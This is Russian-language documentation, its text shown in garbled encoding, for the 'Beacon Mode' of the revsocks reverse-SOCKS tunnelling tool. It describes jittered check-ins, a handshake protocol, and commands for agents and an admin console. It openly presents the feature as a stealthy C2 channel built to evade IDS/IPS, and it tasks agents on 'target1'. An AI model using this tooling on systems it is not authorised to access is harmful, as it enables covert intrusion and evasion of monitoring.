# Beacon Mode (–†–µ–∂–∏–º –ú–∞—è–∫–æ–≤–∞–Ω–∏—è)

**–í–µ—Ä—Å–∏—è:** v2.7  
**–°—Ç–∞—Ç—É—Å:** ‚úÖ Production Ready  
**–î–∞—Ç–∞:** 09.01.2026

---

## üìñ –û–ø–∏—Å–∞–Ω–∏–µ

Beacon Mode ‚Äî —Ä–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã –∞–≥–µ–Ω—Ç–∞ —Å –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–º–∏ check-in –≤–º–µ—Å—Ç–æ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ TCP —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è. –ê–≥–µ–Ω—Ç "–ø—Ä–æ—Å—ã–ø–∞–µ—Ç—Å—è" —á–µ—Ä–µ–∑ –∑–∞–¥–∞–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª, –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É, –ø–æ–ª—É—á–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É (TUNNEL –∏–ª–∏ SLEEP), –∏ –ª–∏–±–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ç—É–Ω–Ω–µ–ª—å, –ª–∏–±–æ —Å–Ω–æ–≤–∞ –∑–∞—Å—ã–ø–∞–µ—Ç.

### –ó–∞—á–µ–º –Ω—É–∂–µ–Ω Beacon Mode?

**–ü—Ä–æ–±–ª–µ–º–∞ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è:**
- –õ–µ–≥–∫–æ –¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ—Ç—Å—è —Å–µ—Ç–µ–≤—ã–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–æ–º (IDS/IPS)
- –ü–æ—Å—Ç–æ—è–Ω–Ω–æ –∑–∞–Ω–∏–º–∞–µ—Ç –ø–æ—Ä—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
- –í—ã—Å–æ–∫–∞—è –≤–∏–¥–∏–º–æ—Å—Ç—å –≤ netstat

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ Beacon Mode:**
- **Stealth:** –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–µ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å–ª–æ–∂–Ω–µ–µ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å
- **–≠–∫–æ–Ω–æ–º–∏—è —Ä–µ—Å—É—Ä—Å–æ–≤:** –°–µ—Ä–≤–µ—Ä –Ω–µ –¥–µ—Ä–∂–∏—Ç –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –¥–ª—è –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã—Ö –∞–≥–µ–Ω—Ç–æ–≤
- **–ì–∏–±–∫–æ—Å—Ç—å:** –ú–æ–∂–Ω–æ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç—å –∞–≥–µ–Ω—Ç–æ–≤ –º–µ–∂–¥—É SLEEP –∏ TUNNEL —Ä–µ–∂–∏–º–∞–º–∏ —á–µ—Ä–µ–∑ Admin API

---

## üèóÔ∏è –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞

### –ö–æ–º–ø–æ–Ω–µ–Ω—Ç—ã

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê          Check-in         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Agent     ‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ> ‚îÇ   Server    ‚îÇ
‚îÇ  (Beacon)   ‚îÇ <‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò      CMD TUNNEL/SLEEP      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ                                           ‚îÇ
       ‚îÇ Sleep (N sec ¬±jitter%)                   ‚îÇ
       ‚îÇ                                           ‚îÇ
       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   Persistent Agent ID
```

### Handshake Protocol v3

**Client ‚Üí Server:**
```
AUTH <password> <agent_id> <version>\n
```

**Server ‚Üí Client:**
```
CMD TUNNEL\n                                  # –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç—É–Ω–Ω–µ–ª—å
CMD SLEEP <interval_sec> <jitter_percent>\n   # –°–ø–∞—Ç—å N —Å–µ–∫—É–Ω–¥ ¬±jitter%
ERR <error_message>\n                         # –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
```

---

## üöÄ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ

### –ó–∞–ø—É—Å–∫ –∞–≥–µ–Ω—Ç–∞ –≤ Beacon Mode

```bash
./revsocks-agent \
  --connect server.example.com:8080 \
  --pass mySecretPassword \
  --beacon \
  --agentid-path ~/.revsocks.id  # Persistent ID (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
```

**–§–ª–∞–≥–∏:**
- `--beacon` ‚Äî –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç —Ä–µ–∂–∏–º beacon (–±–µ–∑ —ç—Ç–æ–≥–æ —Ñ–ª–∞–≥–∞ –∞–≥–µ–Ω—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ legacy —Ä–µ–∂–∏–º–µ —Å –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ–º)
- `--agentid-path` ‚Äî –ø—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è persistent Agent ID (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: `~/.revsocks.id`)

### –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞ —Å Agent Manager

```bash
./revsocks-server \
  --listen :8080 \
  --socks 127.0.0.1:1080 \
  --pass mySecretPassword \
  --agentdb ./agents.json \
  --admin-api \
  --admin-port :8081 \
  --admin-token "your-secure-token"
```

**–ù–æ–≤—ã–µ —Ñ–ª–∞–≥–∏:**
- `--agentdb` ‚Äî –ø—É—Ç—å –∫ JSON —Ñ–∞–π–ª—É —Å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π –∞–≥–µ–Ω—Ç–æ–≤ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: `./agents.json`)
- `--admin-api` ‚Äî –≤–∫–ª—é—á–∏—Ç—å HTTP Admin API
- `--admin-port` ‚Äî –ø–æ—Ä—Ç –¥–ª—è Admin API (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: `:8081`)
- `--admin-token` ‚Äî —Ç–æ–∫–µ–Ω –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ (–µ—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω ‚Äî –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏)

---

## üéÆ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–≥–µ–Ω—Ç–∞–º–∏ (Admin Console)

### –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–æ–Ω—Å–æ–ª–∏

```bash
cd tools/console
pip install -r requirements.txt
export REVSOCKS_TOKEN="your-admin-token"
export REVSOCKS_URL="http://127.0.0.1:8081"  # –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ
python3 main.py
```

### –ö–æ–º–∞–Ω–¥—ã

#### –°–ø–∏—Å–æ–∫ –∞–≥–µ–Ω—Ç–æ–≤
```bash
revsocks> agents list
revsocks> agents list -v  # verbose (—Å –ø–æ–¥—Ä–æ–±–Ω–æ—Å—Ç—è–º–∏)
```

#### –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –∞–≥–µ–Ω—Ç–∞ –≤ SLEEP —Ä–µ–∂–∏–º
```bash
revsocks> agent sleep notebook 60 -j 10
# notebook –±—É–¥–µ—Ç —Å–ø–∞—Ç—å 60 —Å–µ–∫—É–Ω–¥ ¬±10% (54-66 —Å–µ–∫)
```

#### –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –∞–≥–µ–Ω—Ç–∞ –≤ TUNNEL —Ä–µ–∂–∏–º (–ø–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ)
```bash
revsocks> agent wake notebook
# –ü—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º check-in –∞–≥–µ–Ω—Ç —É—Å—Ç–∞–Ω–æ–≤–∏—Ç —Ç—É–Ω–Ω–µ–ª—å
```

#### –ò–∑–º–µ–Ω–∏—Ç—å –∞–ª–∏–∞—Å
```bash
revsocks> agent rename notebook "Production Web Server"
```

#### –£–±–∏—Ç—å –∞–∫—Ç–∏–≤–Ω—É—é —Å–µ—Å—Å–∏—é
```bash
revsocks> session kill notebook
# –ó–∞–∫—Ä—ã–≤–∞–µ—Ç —Ç–µ–∫—É—â—É—é yamux —Å–µ—Å—Å–∏—é, –∞–≥–µ–Ω—Ç –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—Å—è
```

#### –£–¥–∞–ª–∏—Ç—å –∞–≥–µ–Ω—Ç–∞ –∏–∑ –±–∞–∑—ã
```bash
revsocks> agent delete old-agent-id -f  # -f –¥–ª—è –ø—Ä–æ–ø—É—Å–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
```

---

## üìã –°—Ü–µ–Ω–∞—Ä–∏–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è

### –°—Ü–µ–Ω–∞—Ä–∏–π 1: Stealth –û–ø–µ—Ä–∞—Ü–∏—è (–î–µ—Ñ–æ–ª—Ç)

**–¶–µ–ª—å:** –ú–∏–Ω–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤–∏–¥–∏–º–æ—Å—Ç—å –≤ —Å–µ—Ç–∏

**–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:**
- Mode: SLEEP
- Interval: 3600 —Å–µ–∫—É–Ω–¥ (1 —á–∞—Å)
- Jitter: 20% (¬±12 –º–∏–Ω—É—Ç)

**–î–µ–π—Å—Ç–≤–∏—è:**
```bash
revsocks> agent sleep target1 3600 -j 20
```

**–ü–æ–≤–µ–¥–µ–Ω–∏–µ:**
- –ê–≥–µ–Ω—Ç –ø—Ä–æ—Å—ã–ø–∞–µ—Ç—Å—è ~1 —Ä–∞–∑ –≤ —á–∞—Å
- –°–µ—Ä–≤–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç `CMD SLEEP 3600 20`
- –ê–≥–µ–Ω—Ç –∑–∞—Å—ã–ø–∞–µ—Ç –Ω–∞ 48-72 –º–∏–Ω—É—Ç—ã (3600¬±20%)
- –ü–æ–≤—Ç–æ—Ä—è–µ—Ç —Ü–∏–∫–ª

**–ö–æ–≥–¥–∞ –Ω—É–∂–µ–Ω –¥–æ—Å—Ç—É–ø:**
```bash
revsocks> agent wake target1
# –ê–≥–µ–Ω—Ç –ø–µ—Ä–µ–π–¥—ë—Ç –≤ TUNNEL –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º check-in
```

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 2: –û–ø–µ—Ä–∞—Ç–∏–≤–Ω—ã–π –¥–æ—Å—Ç—É–ø

**–¶–µ–ª—å:** –ë—ã—Å—Ç—Ä–∞—è —Ä–µ–∞–∫—Ü–∏—è –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ stealth –º–µ–∂–¥—É –∑–∞–¥–∞—á–∞–º–∏

**–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:**
- Mode: TUNNEL (–≤–æ –≤—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã)
- Mode: SLEEP (–º–µ–∂–¥—É –∑–∞–¥–∞—á–∞–º–∏)
- Interval: 60 —Å–µ–∫—É–Ω–¥

**–î–µ–π—Å—Ç–≤–∏—è:**
```bash
# –ü–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º —Ä–∞–±–æ—Ç—ã
revsocks> agent wake target1
# –î–æ–∂–¥–∞—Ç—å—Å—è check-in (~60 —Å–µ–∫ max), —Ç—É–Ω–Ω–µ–ª—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω

# –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∑–∞–¥–∞—á–∏
revsocks> agent sleep target1 300 -j 10
# –ê–≥–µ–Ω—Ç –∑–∞—Å—ã–ø–∞–µ—Ç –Ω–∞ 4.5-5.5 –º–∏–Ω—É—Ç
```

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 3: –ü–æ—Å—Ç–æ—è–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø (Legacy —Ä–µ–∂–∏–º)

**–¶–µ–ª—å:** –¢—Ä–∞–¥–∏—Ü–∏–æ–Ω–Ω–∞—è C2 –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ —Å –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ–º

**–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:**
- Mode: TUNNEL (–≤—Å–µ–≥–¥–∞)

**–î–µ–π—Å—Ç–≤–∏—è:**
```bash
revsocks> agent wake target1
# –¢—É–Ω–Ω–µ–ª—å –æ—Å—Ç–∞—ë—Ç—Å—è –ø–æ—Å—Ç–æ—è–Ω–Ω–æ –∞–∫—Ç–∏–≤–Ω—ã–º
```

**–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏:**
- –í—ã—Å–æ–∫–∞—è –≤–∏–¥–∏–º–æ—Å—Ç—å
- –ü–æ—Å—Ç–æ—è–Ω–Ω–æ –∑–∞–Ω—è—Ç—ã–π –ø–æ—Ä—Ç
- –õ–µ–≥–∫–æ –¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ—Ç—Å—è

---

## üîê –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å

### Persistent Agent ID

**–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ:** –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SOCKS –ø–æ—Ä—Ç–∞ –ø—Ä–∏ reconnect —Ç–æ–≥–æ –∂–µ –∞–≥–µ–Ω—Ç–∞

**–ú–µ—Ö–∞–Ω–∏–∑–º:**
1. –ü—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ –∞–≥–µ–Ω—Ç –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç UUID v4 (–∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç hostname)
2. ID —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ —Ñ–∞–π–ª (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é `~/.revsocks.id`)
3. –ü—Ä–∏ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ —Å–µ—Ä–≤–µ—Ä —Ä–∞—Å–ø–æ–∑–Ω–∞—ë—Ç –∞–≥–µ–Ω—Ç–∞ –ø–æ ID –∏ –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–æ—Ä—Ç

**–ò–∑–º–µ–Ω–µ–Ω–∏–µ ID:**
```bash
# –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –Ω–æ–≤–æ–≥–æ ID
rm ~/.revsocks.id
./revsocks-agent --beacon ...
```

### Admin API Security

**–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è:**
- –í—Å–µ endpoints (–∫—Ä–æ–º–µ `/health`) —Ç—Ä–µ–±—É—é—Ç `X-Admin-Token` header
- –¢–æ–∫–µ–Ω –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ (–∏–ª–∏ —É–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ `--admin-token`)

**Best Practices:**
1. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–ª–æ–∂–Ω—ã–π —Ç–æ–∫–µ–Ω (–º–∏–Ω–∏–º—É–º 32 —Å–∏–º–≤–æ–ª–∞)
2. –ù–µ —Ö—Ä–∞–Ω–∏—Ç–µ —Ç–æ–∫–µ–Ω –≤ –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥
3. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è (`REVSOCKS_TOKEN`)
4. –û–≥—Ä–∞–Ω–∏—á—å—Ç–µ –¥–æ—Å—Ç—É–ø –∫ Admin API –ø–æ—Ä—Ç–∞–º (firewall)

**–ü—Ä–∏–º–µ—Ä secure –∑–∞–ø—É—Å–∫–∞:**
```bash
export ADMIN_TOKEN=$(openssl rand -hex 32)
./revsocks-server ... --admin-token "$ADMIN_TOKEN"
```

---

## üêõ Troubleshooting

### –ê–≥–µ–Ω—Ç –Ω–µ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –≤ SLEEP —Ä–µ–∂–∏–º

**–°–∏–º–ø—Ç–æ–º:** –ê–≥–µ–Ω—Ç –æ—Å—Ç–∞—ë—Ç—Å—è –≤ TUNNEL —Ä–µ–∂–∏–º–µ –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã `agent sleep`

**–ü—Ä–∏—á–∏–Ω–∞:** –ö–æ–º–∞–Ω–¥–∞ –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º check-in

**–†–µ—à–µ–Ω–∏–µ:**
1. –£–±–∏—Ç—å —Ç–µ–∫—É—â—É—é —Å–µ—Å—Å–∏—é: `session kill <id>`
2. –î–æ–∂–¥–∞—Ç—å—Å—è reconnect –∞–≥–µ–Ω—Ç–∞
3. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å: `agents list -v` (–¥–æ–ª–∂–Ω–æ –±—ã—Ç—å Mode: SLEEP)

### –ê–≥–µ–Ω—Ç –Ω–µ –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è (Auth error)

**–°–∏–º–ø—Ç–æ–º:** –õ–æ–≥–∏ –∞–≥–µ–Ω—Ç–∞: `ERR Invalid password`

**–ü—Ä–∏—á–∏–Ω—ã:**
1. –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å `--pass`)
2. –ê–≥–µ–Ω—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç legacy –ø—Ä–æ—Ç–æ–∫–æ–ª (—É–±–µ–¥–∏—Ç–µ—Å—å —á—Ç–æ —Ñ–ª–∞–≥ `--beacon` —É–∫–∞–∑–∞–Ω)

### SOCKS –ø–æ—Ä—Ç –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç

**–°–∏–º–ø—Ç–æ–º:** `curl --socks5 127.0.0.1:1080` –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –æ—à–∏–±–∫—É

**–ü—Ä–∏—á–∏–Ω—ã:**
1. –ê–≥–µ–Ω—Ç –≤ SLEEP —Ä–µ–∂–∏–º–µ ‚Üí –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç—å –Ω–∞ TUNNEL: `agent wake <id>`
2. Yamux —Å–µ—Å—Å–∏—è –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –ª–æ–≥–∏ —Å–µ—Ä–≤–µ—Ä–∞
3. –ù–µ–≤–µ—Ä–Ω—ã–π SOCKS –∞–¥—Ä–µ—Å ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ñ–ª–∞–≥ `--socks`

### E2E —Ç–µ—Å—Ç `TestE2E_BeaconSleepCycle` –ø–∞–¥–∞–µ—Ç

**–ü—Ä–∏—á–∏–Ω–∞:** –¢–µ—Å—Ç –∏—â–µ—Ç —Å—Ç—Ä–æ–∫—É `"AUTH"` –≤ –ª–æ–≥–∞—Ö –∞–≥–µ–Ω—Ç–∞, –Ω–æ beacon –∞–≥–µ–Ω—Ç –≤—ã–≤–æ–¥–∏—Ç `"BEACON mode"`

**–†–µ—à–µ–Ω–∏–µ:** –û–±–Ω–æ–≤–ª—ë–Ω –≤ –∫–æ–º–º–∏—Ç–µ (–∏—Å–ø—Ä–∞–≤–ª–µ–Ω–æ `WaitForLog("BEACON mode", ...)`)

---

## üìä –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å

### Overhead Beacon Mode

**Handshake v3:**
- –†–∞–∑–º–µ—Ä: ~50-70 –±–∞–π—Ç (text protocol)
- –í—Ä–µ–º—è: <10ms (–ª–æ–∫–∞–ª—å–Ω–∞—è —Å–µ—Ç—å), <200ms (–∏–Ω—Ç–µ—Ä–Ω–µ—Ç)

**–°—Ä–∞–≤–Ω–µ–Ω–∏–µ:**
| –ú–µ—Ç—Ä–∏–∫–∞ | –ü–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ | Beacon (1 —á–∞—Å) |
|---------|----------------------|---------------|
| –¢—Ä–∞—Ñ–∏–∫ keepalive | ~1 KB/–º–∏–Ω | 0 |
| Check-in —Ç—Ä–∞—Ñ–∏–∫ | 0 | ~100 bytes/—á–∞—Å |
| –ü–æ—Ä—Ç–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ | 1 –ø–æ—Å—Ç–æ—è–Ω–Ω–æ | 0 (–º–µ–∂–¥—É check-ins) |
| –ó–∞–¥–µ—Ä–∂–∫–∞ –¥–æ—Å—Ç—É–ø–∞ | 0 | –¥–æ 1 —á–∞—Å–∞ (configurable) |

---

## üîÑ –ú–∏–≥—Ä–∞—Ü–∏—è —Å Legacy —Ä–µ–∂–∏–º–∞

### –î–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –∞–≥–µ–Ω—Ç–æ–≤

**–°—Ç–∞—Ä—ã–π —Å–ø–æ—Å–æ–± (legacy):**
```bash
./revsocks-agent --connect server:8080 --pass mypass
# –ü–æ—Å—Ç–æ—è–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
```

**–ù–æ–≤—ã–π —Å–ø–æ—Å–æ–± (beacon):**
```bash
./revsocks-agent --connect server:8080 --pass mypass --beacon
# –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–µ check-ins
```

**–û–±—Ä–∞—Ç–Ω–∞—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å:**
- –°–µ—Ä–≤–µ—Ä –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –æ–±–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ (v2 –∏ v3) –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ
- Legacy –∞–≥–µ–Ω—Ç—ã (–±–µ–∑ `--beacon`) —Ä–∞–±–æ—Ç–∞—é—Ç –∫–∞–∫ —Ä–∞–Ω—å—à–µ
- Beacon –∞–≥–µ–Ω—Ç—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç –Ω–æ–≤—ã–π handshake v3

---

## üìà Roadmap

### –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ (v2.7)
- ‚úÖ Handshake v3 Protocol
- ‚úÖ Persistent Agent ID
- ‚úÖ AgentManager —Å JSON persistence
- ‚úÖ Beacon Loop (SLEEP/TUNNEL state machine)
- ‚úÖ Jitter calculation
- ‚úÖ Admin HTTP API
- ‚úÖ Python Admin Console
- ‚úÖ Unit & E2E —Ç–µ—Å—Ç—ã

### –ü–ª–∞–Ω–∏—Ä—É–µ—Ç—Å—è
- üîú WebSocket support –¥–ª—è Handshake v3
- üîú SQLite/PostgreSQL –≤–º–µ—Å—Ç–æ JSON (–¥–ª—è >1000 –∞–≥–µ–Ω—Ç–æ–≤)
- üîú Audit log (–∫—Ç–æ/–∫–æ–≥–¥–∞ –∏–∑–º–µ–Ω–∏–ª –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é)
- üîú Metrics (Prometheus exporter)
- üîú Rate limiting –¥–ª—è Admin API
- üîú Encrypted C2 channel (–ø–æ–º–∏–º–æ TLS)

---

**–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ:** 09.01.2026  
**–í–µ—Ä—Å–∏—è –¥–æ–∫—É–º–µ–Ω—Ç–∞:** 1.0
